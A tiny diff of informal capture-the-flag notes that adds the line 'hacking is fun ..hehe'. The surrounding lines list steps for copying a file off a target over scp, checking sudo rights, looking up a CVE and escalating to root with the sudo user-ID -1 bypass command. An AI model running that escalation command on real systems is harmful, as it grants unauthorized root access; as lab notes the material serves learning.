@@ -13,3 +13,4 @@ sudo scp james@<target ip>:Alien_autospy.jpg ~/ ...to copy img frm ssh to device
 sudo -l to see wht priv a user has
 then google to find cve 
 sudo -u#-1 /bin/bash..then go to root directory n find flag!!!xp
+hacking is fun ..hehe
